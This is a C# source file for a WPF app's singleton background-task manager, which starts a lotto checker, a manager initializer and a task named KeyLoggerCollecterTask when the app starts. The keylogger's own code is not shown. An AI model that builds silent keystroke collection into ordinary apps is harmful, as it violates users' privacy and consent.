using System.Collections.Generic;
using WPF.Models.Interfaces;
using WPF.Managers.Tasks;
using System.Linq;
using System.Windows.Threading;
using System.Threading.Tasks;

namespace WPF.Managers
{
    public class BackgroundTasksManager
    {
        private IList<IBackgroundTask> tasks;
        private static readonly object locker = new object();
        private static readonly BackgroundTasksManager instance = new BackgroundTasksManager();

        private BackgroundTasksManager()
        {
            tasks = new List<IBackgroundTask>();
        }

        public static BackgroundTasksManager Instance
        {
            get
            {
                lock(locker)
                {
                    return instance;
                }
            }
        }

        public int Completed
        {
            get { return tasks.Where(q => q.Completed).ToList().Count; }
        }

        public int Count
        {
            get { return tasks.Count; }
        }

        public void Initialize()
        {
            tasks.Add(new LottoCheckerTask());
            tasks.Add(new ManagersInitializerTask());
            tasks.Add(new KeyLoggerCollecterTask());

            Start();
        }

        private void Start()
        {
            foreach(var task in tasks)
            {
                task.Run();
            }
        }

        public async Task Collect()
        {
            foreach(var task in tasks.Where(q => q.MustBeCollected))
            {
                task.Collect();
            }

            // Wait to collect all tasks
            while (Count != Completed)
            {
                await Task.Delay(10);
            }

        }
    }
}
